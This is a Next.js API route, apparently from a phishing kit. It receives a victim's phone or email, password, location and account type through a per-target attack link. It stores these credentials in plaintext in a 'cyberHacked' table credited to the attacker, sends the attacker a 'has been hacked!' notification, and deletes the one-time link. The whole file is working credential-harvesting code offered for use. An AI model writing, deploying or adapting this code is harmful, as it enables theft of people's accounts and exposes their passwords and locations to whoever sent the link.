import { NextRequest, NextResponse } from "next/server";
import { db, cyberAttacks, cyberHacked, notifications } from "@/lib/db";
import { eq } from "drizzle-orm";

export async function POST(req: NextRequest) {
  const body = await req.json();
  const { linkId, phoneOrEmail, password, location, accountType } = body;

  if (!linkId || !phoneOrEmail || !password || !accountType) {
    return NextResponse.json({ error: "Missing fields" }, { status: 400 });
  }

  // Find the attack by linkId
  const [attack] = await db.select().from(cyberAttacks).where(eq(cyberAttacks.linkId, linkId));
  if (!attack) return NextResponse.json({ error: "Invalid link" }, { status: 404 });

  // Insert hacked record
  await db.insert(cyberHacked).values({
    receiverId: attack.senderId,
    phoneOrEmail,
    password,
    accountType,
    location: location || "",
    linkId,
  });

  // Notify the attacker
  const contact = attack.targetPhone !== "unset" ? attack.targetPhone : attack.targetEmail;
  await db.insert(notifications).values({
    userId: attack.senderId,
    type: "system",
    content: `Target with contact ${contact} has been hacked!`,
  });

  // Delete the attack (link used up)
  await db.delete(cyberAttacks).where(eq(cyberAttacks.linkId, linkId));

  return NextResponse.json({ success: true });
}
